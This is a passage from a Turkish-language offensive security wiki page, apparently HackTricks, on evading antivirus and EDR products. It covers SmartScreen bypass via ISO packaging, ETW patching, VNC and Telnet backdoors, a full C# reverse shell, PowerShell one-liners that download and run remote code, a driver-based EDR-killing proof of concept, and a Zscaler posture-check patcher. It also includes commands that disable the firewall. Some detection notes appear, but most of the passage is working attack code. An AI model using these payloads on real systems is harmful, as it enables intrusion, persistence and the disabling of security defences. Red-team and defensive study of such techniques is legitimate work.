python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken yararlı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – *clean* file'ı **de4dot-cex**'e (ConfuserEx-aware de4dot fork'u) verin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile'ını seçer
• de4dot control-flow flattening'i geri alır, original namespace'leri, class'ları ve variable name'leri geri yükler ve constant string'leri decrypt eder.

3.  Proxy-call stripping – ConfuserEx, decompilation'ı daha da bozmak için doğrudan method call'larını lightweight wrapper'larla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra opaque wrapper function'lar (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'leri görmelisiniz.

4.  Manual clean-up – Ortaya çıkan binary'yi dnSpy altında çalıştırın; gerçek payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğunlukla bunu `<Module>.byte_0` içinde initialize edilen TLV-encoded bir byte array olarak saklar.

Yukarıdaki chain, malicious sample'ı çalıştırmaya **gerek kalmadan** execution flow'u geri oluşturur. Bu, offline bir workstation üzerinde çalışırken kullanışlıdır.

> 🛈  ConfuserEx, sample'ları otomatik olarak triage etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla artırılmış yazılım güvenliği sağlayabilen, [LLVM](http://www.llvm.org/) compilation suite'in açık kaynaklı bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir harici araç kullanmadan ve compiler'ı değiştirmeden, compile time'da obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı crack etmek isteyen kişinin işini biraz daha zorlaştıracak şekilde, C++ template metaprogramming framework tarafından oluşturulan obfuscated operations katmanı ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil olmak üzere çeşitli PE file'ları obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executables için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan, LLVM-supported diller için fine-grained code obfuscation framework'üdür. ROPfuscator, regular instructions'ı ROP chains'e dönüştürerek bir programı assembly code seviyesinde obfuscate eder ve normal control flow'a ilişkin doğal kavrayışımızı engeller.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürebilir ve ardından yükleyebilir.

## SmartScreen & MoTW

İnternetten bazı executable'ları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaya karşı korumak için tasarlanmış bir security mechanism'dir.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen esas olarak reputation-based bir yaklaşımla çalışır; bu, yaygın olmayan download uygulamalarının SmartScreen'i tetikleyerek son kullanıcıyı uyaracağı ve dosyayı çalıştırmasını engelleyeceği anlamına gelir (dosya yine de More Info -> Run anyway seçeneğine tıklanarak çalıştırılabilir).

**MoTW** (Mark of The Web), internetten dosya indirildiğinde, indirildiği URL ile birlikte otomatik olarak oluşturulan ve Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sinin kontrol edilmesi.</p></figcaption></figure>

> [!TIP]
> **trusted** bir signing certificate ile imzalanmış executable'ların **SmartScreen'i tetiklemeyeceğini** unutmamak önemlidir.

Payload'larınızın Mark of The Web almasını önlemenin oldukça etkili bir yolu, onları ISO gibi bir tür container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **non-NTFS** volume'lara uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak amacıyla payload'ları output container'larına paketleyen bir araçtır.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
İşte payload'ları [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak ISO dosyalarının içine paketleyip SmartScreen'i bypass etmeye yönelik bir demo

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları loglamasına** olanak tanıyan güçlü bir logging mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, user space process'in **`EtwEventWrite`** fonksiyonunun herhangi bir olay loglamadan hemen dönmesini sağlamak da mümkündür. Bu işlem, fonksiyonun bellekte patch'lenerek hemen dönmesinin sağlanmasıyla gerçekleştirilir ve böylece ilgili process için ETW logging devre dışı bırakılır.

Daha fazla bilgiyi **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinde bulabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini belleğe yükleme uzun zamandır bilinen bir yöntemdir ve yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ oldukça iyi bir yoldur.

Payload doğrudan belleğe yükleneceği ve diske yazılmayacağı için yalnızca tüm process için AMSI'yi patch'lememiz gerekecektir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma olanağı sunar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem **yeni bir sacrificial process oluşturmayı**, post-exploitation amaçlı kötü amaçlı kodunuzu bu yeni process'e inject etmeyi, kötü amaçlı kodunuzu çalıştırmayı ve işlem tamamlandığında yeni process'i sonlandırmayı içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, çalıştırmanın **Beacon implant process'imizin dışında** gerçekleşmesidir. Bu, post-exploitation işlemlerimizden birinde bir şeyler ters gider veya yakalanırsa **implant'ımızın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma olasılığınızın daha yüksek olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation amaçlı kötü amaçlı kodu **kendi process'ine** inject etmeyi ifade eder. Böylece yeni bir process oluşturmanız ve bu process'in AV tarafından taranması gerekliliğini ortadan kaldırabilirsiniz; ancak dezavantajı, payload'ınızın çalıştırılması sırasında bir şeyler ters giderse çökebileceği için **beacon'ınızı kaybetme** olasılığınızın **çok daha yüksek** olmasıdır.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loading hakkında daha fazla bilgi edinmek istiyorsanız şu makaleye [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve ilgili InlineExecute-Assembly BOF'a ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assembly'lerini **PowerShell'den** de yükleyebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) içeriklerine göz atın.

## Other Programming Languages Kullanımı

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) adresinde önerildiği üzere, ele geçirilmiş makineye **Attacker Controlled SMB share üzerinde kurulu interpreter environment'a** erişim sağlayarak diğer diller kullanılarak kötü amaçlı kod çalıştırmak mümkündür.

Interpreter Binary'lerine ve SMB share üzerindeki environment'a erişim sağlayarak bu dillerdeki **arbitrary code'u ele geçirilmiş makinenin belleği içinde çalıştırabilirsiniz**.

Repo, Defender'ın script'leri hâlâ taradığını; ancak Go, Java, PHP vb. kullanarak **static signature'ları bypass etmek için daha fazla esnekliğe** sahip olduğumuzu belirtiyor. Bu dillerde rastgele, obfuscation uygulanmamış reverse shell script'leriyle yapılan testler başarılı olmuştur.

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün access token'ını manipüle eder. Token'ın yetkilerini azaltmak, process'in çalışmaya devam etmesini sağlarken privileged inspection veya remediation işlemlerini gerçekleştirmesini engelleyebilir.

Bunu önlemek için Windows, **external process'lerin** security process'lerinin token'ları üzerinde handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software Kullanımı

### Chrome Remote Desktop

[**bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, Chrome Remote Desktop'ı kurbanın bilgisayarına deploy etmek ve ardından bilgisayarın kontrolünü ele geçirip persistence sağlamak kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine tıklayın ve ardından MSI dosyasını indirmek için Windows MSI dosyasına tıklayın.
2. Installer'ı kurbanda sessizce çalıştırın (admin gereklidir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Wizard sizden authorize etmenizi isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Sağlanan command'ı gerekli düzenlemelerle çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi GUI kullanmadan PIN'i ayarlar).


## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemdeki çok sayıda farklı telemetry kaynağını hesaba katmanız gerekir. Bu nedenle mature environment'larda tamamen undetected kalmak neredeyse imkânsızdır.

Karşı karşıya kaldığınız her environment'ın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha Advanced Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi kesinlikle öneririm.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu ayrıca [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılan başka bir harika konuşmadır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Defender'ın hangi kısımları malicious olarak tespit ettiğini kontrol etme**

**Binary'nin bölümlerini**, Defender'ın hangi bölümün malicious olduğunu **bulana kadar kaldırıp** bunu size parçalara ayıran [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz.\
Aynı işi yapan bir diğer araç [**avred**](https://github.com/dobin/avred)'dir; bu hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık bir web interface'i üzerinden sunar.

### **Telnet Server**

Windows10'a kadar tüm Windows sürümleri, şu komut kullanılarak (administrator olarak) kurulabilen bir **Telnet server** ile birlikte geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlasın** ve şimdi **çalıştırın**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet portunu değiştir** (gizlilik) ve güvenlik duvarını devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Buradan download edin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin downloads'ı istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve server'ı configure edin:

- _Disable TrayIcon_ seçeneğini enable edin
- _VNC Password_ alanında bir password belirleyin
- _View-Only Password_ alanında bir password belirleyin

Ardından binary _**winvnc.exe**_ dosyasını ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker**, reverse **VNC connection**'ı yakalamaya **hazır** olması için kendi **host**'u içinde `vncviewer.exe -listen 5900` binary'sini **execute** etmelidir. Ardından **victim** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**WARNING:** Stealth'i korumak için bazı şeyleri yapmamalısınız

- Zaten çalışıyorsa `winvnc`'yi başlatmayın, aksi takdirde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. `tasklist | findstr winvnc` ile çalışıp çalışmadığını kontrol edin
- Aynı directory içinde `UltraVNC.ini` olmadan `winvnc`'yi başlatmayın, aksi takdirde [config window](https://i.imgur.com/rfMQWcf.png) açılır
- Help için `winvnc -h` çalıştırmayın, aksi takdirde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Buradan download edin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT içinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **listener'ı başlatın**: `msfconsole -r file.rc` ve **xml payload'ı** şu komutla **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut Defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# reverse shell

Şununla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Compiler kullanarak C#
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanımı örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Kendi Savunmasız Driver'ını Getir (BYOVD) – AV/EDR'yi Kernel Alanından Sonlandırma

Storm-2603, ransomware bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir console utility kullandı. Araç, **kendi savunmasız ancak *imzalı* driver'ını** getirir ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bu driver'ı kötüye kullanır.<sup>[[12]](#references)</sup>

Temel çıkarımlar
1. **İmzalı driver**: Diske bırakılan dosya `ServiceMouse.sys` olsa da binary, Antiy Labs’ın “System In-Depth Analysis Toolkit” ürünündeki meşru şekilde imzalanmış `AToolsKrnl64.sys` driver'ıdır. Driver geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Service kurulumu**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır driver'ı bir **kernel service** olarak kaydeder, ikinci satır ise `\\.\ServiceMouse` öğesinin user land'den erişilebilir hâle gelmesi için driver'ı başlatır.
3. **Driver tarafından sunulan IOCTL'ler**
| IOCTL code | Yetenek                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir process'i sonlandırma (Defender/EDR servislerini öldürmek için kullanılır) |
| `0x990000D0` | Diskteki rastgele bir dosyayı silme |
| `0x990001D0` | Driver'ı unload etme ve service'i kaldırma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden çalışır**:  BYOVD user-mode korumalarını tamamen atlar; kernel'de çalışan code, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *protected* process'leri açabilir, sonlandırabilir veya kernel object'lerini değiştirebilir.

Tespit / Azaltma
•  Windows’un `AToolsKrnl64.sys` dosyasını yüklemeyi reddetmesi için Microsoft’un vulnerable-driver block list özelliğini (`HVCI`, `Smart App Control`) etkinleştirin.
•  Yeni *kernel* service oluşturulmalarını izleyin ve bir driver world-writable bir directory'den yüklendiğinde veya allow-list'te bulunmadığında uyarı oluşturun.
•  Custom device object'lerine yönelik user-mode handle'ları ve bunları takip eden şüpheli `DeviceIoControl` çağrılarını izleyin.

### Disk Üzerindeki Binary Patching ile Zscaler Client Connector Posture Check'lerini Atlatma

Zscaler’ın **Client Connector** ürünü device-posture kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye güvenir. İki zayıf tasarım tercihi tam bir bypass'ı mümkün kılar:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşir (server'a bir boolean gönderilir).
2. Internal RPC endpoint'leri yalnızca bağlantı kuran executable'ın Zscaler tarafından **imzalanmış** olduğunu (`WinVerifyTrust` aracılığıyla) doğrular.<sup>[[11]](#references)</sup>

**Disk üzerindeki dört imzalı binary'yi patch'leyerek** her iki mekanizma etkisiz hâle getirilebilir:

| Binary | Patch'lenen özgün mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her check'in compliant olması için daima `1` döndürür |
| `ZSAService.exe` | `WinVerifyTrust`'e indirect call | NOP-ed ⇒ herhangi bir (unsigned olsa bile) process RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tunnel üzerindeki integrity check'leri | Kısa devreye alınır |

Minimal patcher alıntısı:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Tüm** posture kontrolleri **yeşil/uyumlu** görünür.
* İmzalanmamış veya değiştirilmiş binary'ler, adlandırılmış pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş host, Zscaler policies tarafından tanımlanan internal network'e kısıtlamasız erişim elde eder.

Bu vaka çalışması, tamamen client-side trust kararlarının ve basit signature kontrollerinin birkaç byte patch'iyle nasıl aşılabileceğini gösterir.

## LOLBINs Kullanarak Protected Process Light (PPL) ile AV/EDR'yi Değiştirme

Protected Process Light (PPL), yalnızca eşit veya daha yüksek koruma seviyesine sahip process'lerin birbirlerini değiştirebilmesini sağlayan bir signer/level hiyerarşisi uygular. Saldırı amacıyla, PPL-enabled bir binary'yi meşru şekilde başlatabilir ve argümanlarını kontrol edebilirseniz, benign işlevselliği (ör. logging) AV/EDR tarafından kullanılan protected directory'lere karşı kısıtlı, PPL-backed bir write primitive'e dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir process'i PPL olarak çalıştıran unsurlar
- Hedef EXE (ve yüklenen DLL'ler), PPL-capable bir EKU ile imzalanmış olmalıdır.
- Process, şu flags kullanılarak CreateProcess ile oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary'nin signer'ıyla eşleşen uyumlu bir protection level istenmelidir (ör. anti-malware signer'ları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'ları için `PROTECTION_LEVEL_WINDOWS`). Yanlış level'lar oluşturma işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS protection hakkında daha geniş bir giriş için ayrıca şuraya bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level'ı seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım biçimi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive'i: ClipUp.exe
- İmzalı sistem binary'si `C:\Windows\System32\ClipUp.exe` kendini başlatır ve caller tarafından belirtilen path'e bir log file yazmak için bir parametre kabul eder.
- PPL process olarak başlatıldığında file write işlemi PPL backing ile gerçekleşir.
- ClipUp, space içeren path'leri parse edemez; normalde korunan konumları göstermek için 8.3 short path'leri kullanın.

8.3 short path yardımcıları
- Short name'leri listeleyin: Her parent directory'de `dir /x`.
- cmd'de short path'i türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (özet)
1) Bir launcher (ör. CreateProcessAsPPL) kullanarak PPL-capable LOLBIN'i (ClipUp) `CREATE_PROTECTED_PROCESS` ile başlatın.
